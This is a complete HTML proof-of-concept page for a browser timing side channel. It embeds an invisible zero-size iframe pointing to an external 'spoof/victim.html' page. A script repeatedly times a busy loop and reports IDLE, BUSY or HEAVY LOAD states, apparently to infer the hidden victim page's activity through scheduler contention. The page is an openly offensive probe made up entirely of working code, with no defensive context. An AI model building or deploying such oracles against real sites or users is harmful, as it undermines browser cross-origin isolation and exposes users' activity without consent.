<!doctype html>
<meta charset="utf-8">
<title>Scheduler Oracle FINAL</title>

<h2>Scheduler Contention Oracle</h2>
<pre id="log"></pre>

<iframe src="https://cnfdnfial-ops.github.io/spoof/victim.html" style="width:0;height:0;border:0"></iframe>

<script>
const log = m => {
  document.getElementById('log').textContent += m + "\n"
  console.log(m)
}

// ===== HIGH RESOLUTION TASK =====
function probe() {
  const t0 = performance.now()

  let x = 0
  for (let i = 0; i < 5e6; i++) {
    x += i
  }

  return performance.now() - t0
}

// ===== SAMPLING =====
function measure() {
  let sum = 0
  for (let i = 0; i < 3; i++) sum += probe()
  return sum / 3
}

let history = []

setInterval(() => {
  const t = measure()
  history.push(t)

  if (history.length > 20) history.shift()

  const avg = history.reduce((a,b)=>a+b,0)/history.length

  let state = "IDLE"
  if (t > avg * 1.5) state = "BUSY 🔥"
  if (t > avg * 2.5) state = "HEAVY LOAD 💣"

  log(`t=${t.toFixed(2)} avg=${avg.toFixed(2)} => ${state}`)

}, 150)
</script>
